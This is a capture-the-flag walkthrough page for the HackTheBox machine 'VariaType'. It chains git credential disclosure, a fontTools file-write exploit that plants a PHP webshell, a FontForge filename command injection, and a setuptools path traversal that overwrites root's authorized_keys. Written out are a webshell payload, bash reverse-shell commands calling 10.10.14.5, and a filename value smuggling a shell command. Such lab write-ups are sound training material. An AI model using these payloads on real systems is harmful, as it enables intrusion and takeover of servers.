---
layout: default
title: "VariaType"
parent: Medium Machines
grand_parent: Machines
permalink: /machines/medium/variatype/
---

# VariaType

![Machine Badge](https://img.shields.io/badge/Machine-VariaType-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Season](https://img.shields.io/badge/Season-10%20Week%207-purple)

| Property | Value |
|----------|-------|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | 2026-03-15 (Season 10, Week 7) |
| **Tags** | #git-disclosure #fonttools #fontforge #setuptools #path-traversal #cve-2025-66034 #cve-2024-25082 #cve-2025-47273 |

---

## Summary

VariaType is a font-processing web stack with two virtual hosts (public + internal). Initial foothold chains an exposed `.git` directory whose history contains hardcoded credentials, then weaponises **CVE-2025-66034** (fontTools varLib arbitrary file write via XML/CDATA injection in `.designspace`) to drop a PHP webshell. Lateral movement abuses **CVE-2024-25082** (FontForge ZIP-filename command injection) for shell as a real user. Root comes from a sudo-runnable Python script that fetches plugins from a remote URL, parsed by a vulnerable setuptools version - **CVE-2025-47273** path traversal writes the attacker's authorized_keys to `/root/.ssh/`.

---

## External Writeups

- [HavocSec - VariaType Complete Writeup](https://havocsec.me/pentesting/hackthebox/htb-variatype-complete-writeup)
- [Medium - ItsSunshineXD](https://itssunshinexd.medium.com/htb-writeup-variatype-dc75e409ee8e)
- [HTB-Andres (Beehiiv)](https://htb-writeup.beehiiv.com/p/variatype-machine-hackthebox)
- [GitHub: Bimo754 - VariaType README](https://github.com/Bimo754/Writeups-Public/blob/main/Linux/Medium/VariaType/README.md)
- [Ibrahim Isiaq Bolaji](https://www.ibrahimisiaqbolaji.com/2026/03/variatype-htb-write-up.html)
- [CyberSecGuru](https://thecybersecguru.com/ctf-walkthroughs/mastering-variatype-beginners-guide-from-hackthebox/)
- [1337 Sheets - VariaType Medium (Mar 15, 2026)](https://1337sheets.com/hack-the-box-season-10-htb-variatype-writeup-medium-weekly-march-15th-2026-2/)
- [HackTheBox VariaType Walkthrough - YouTube](https://www.youtube.com/watch?v=-F_rb3xsFZk)

---

## Key Techniques

- Git directory exposure (`.git/HEAD`) and `git log -p` for deleted-commit secrets
- **CVE-2025-66034** - fontTools varLib XML CDATA injection / arbitrary file write
- Crafting malicious `.designspace` to write PHP into webroot
- **CVE-2024-25082** - FontForge ZIP filename command injection
- **CVE-2025-47273** - setuptools `PackageIndex` path traversal in wheel downloads
- Privileged Python plugin loader writes attacker key to `/root/.ssh/authorized_keys`

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC variatype.htb
# 22, 80
ffuf -u http://FUZZ.variatype.htb -H "Host: FUZZ.variatype.htb" \
     -w ~/wordlists/subdomains.txt -mc 200,403
# git.variatype.htb / dev.variatype.htb (internal)
```

### 2. Git Disclosure

```bash
wget -r http://git.variatype.htb/.git/
cd variatype.git && git log --all --oneline
git log -p | grep -i 'password\|api_key\|token'
# -password = "<creds>"  (in a reverted commit)
```

Credentials grant access to the internal-only font submission portal.

### 3. CVE-2025-66034 - fontTools File Write

Craft `.designspace` with XML CDATA injection that bypasses output-path validation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<designspace format="5.0">
  <sources>
    <source filename="../../../../../var/www/html/shell.php" name="x">
      <![CDATA[<?php system($_GET['c']); ?>]]>
    </source>
  </sources>
</designspace>
```

Upload, pipeline writes `shell.php` under webroot. Trigger:

```bash
curl 'http://variatype.htb/shell.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261%22'
```

### 4. Lateral via FontForge Command Injection

```bash
sudo -u fontuser /usr/bin/fontforge -script /opt/fontforge/process.py "<user input>"
```

`process.py` shells out to a ZIP utility with the user-provided filename. **CVE-2024-25082**: the filename is interpolated into a shell command:

```bash
filename="x;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1';.zip"
```

### 5. Root via Sudo Python Plugin Loader

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *
```

`plugin_loader.py` calls `setuptools.package_index.PackageIndex.download(url, tmpdir)` which is vulnerable to **CVE-2025-47273** (path traversal in filename derivation). Host a wheel whose URL forces a write outside `tmpdir`:

```bash
python3 -m http.server 8000 &
# Serve a file named ../../../root/.ssh/authorized_keys with your pubkey
sudo /usr/bin/python3 /opt/plugin_loader.py http://10.10.14.5:8000/wheel
ssh root@variatype.htb
```

---

## Lessons Learned

- `.git/` directory disclosure is timeless - greybox audits should still grep for it on every box.
- XML CDATA injection in font/SVG/typography tooling is the new template-injection frontier (fontTools, FontForge).
- `setuptools` historically trusts remote filenames - **CVE-2025-47273** turned `pip` and any setuptools-using script into path-traversal sinks.
- Multi-CVE chains under a single sudo rule remain the highest-paid bug-hunting target in 2026.
